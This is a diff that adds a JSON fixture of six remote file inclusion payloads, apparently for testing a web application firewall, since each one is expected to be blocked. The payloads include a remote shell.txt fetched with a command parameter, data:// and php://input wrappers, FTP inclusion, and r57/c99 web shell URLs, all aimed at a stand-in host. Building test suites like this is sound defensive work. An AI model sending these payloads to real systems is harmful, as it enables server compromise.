@@ -1,0 +1,64 @@
+{
+  "category": "Remote File Inclusion",
+  "cwe": "CWE-98",
+  "owasp": "A03:2021 - Injection",
+  "description": "Remote file inclusion payloads.",
+  "payloads": [
+    {
+      "id": "RFI-001",
+      "name": "Basic PHP RFI via http://",
+      "method": "GET",
+      "path": "/login",
+      "query": "page=http%3A%2F%2Ftest.example.com%2Fshell.txt%3Fcmd%3Dls",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "RFI-002",
+      "name": "Data stream wrapper (base64)",
+      "method": "GET",
+      "path": "/login",
+      "query": "page=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgZWNobyAiaGVsbG8iOyA%2FPg%3D%3D",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "RFI-003",
+      "name": "FTP inclusion (POST)",
+      "method": "POST",
+      "path": "/api/processor",
+      "body": {"source": "ftp://test.example.com/payload.txt"},
+      "content_type": "application/json",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "RFI-004",
+      "name": "Double-encoded http URL",
+      "method": "GET",
+      "path": "/include",
+      "query": "file%3Dhttp%253A%252F%252Ftest.example.com%252Fexploit.txt",
+      "severity": "CRITICAL",
+      "expected": "block"
+    },
+    {
+      "id": "RFI-005",
+      "name": "PHP stream wrapper (php://input)",
+      "method": "GET",
+      "path": "/parse",
+      "query": "content=php%3A%2F%2Finput",
+      "severity": "HIGH",
+      "expected": "block"
+    },
+    {
+      "id": "RFI-006",
+      "name": "Multiple malicious filenames array",
+      "method": "POST",
+      "path": "/api/import",
+      "body": {"files": ["http://test.example.com/r57.php", "https://test.example.com/c99.php"]},
+      "content_type": "application/json",
+      "severity": "CRITICAL",
+      "expected": "block"
+    }
+  ]
+}
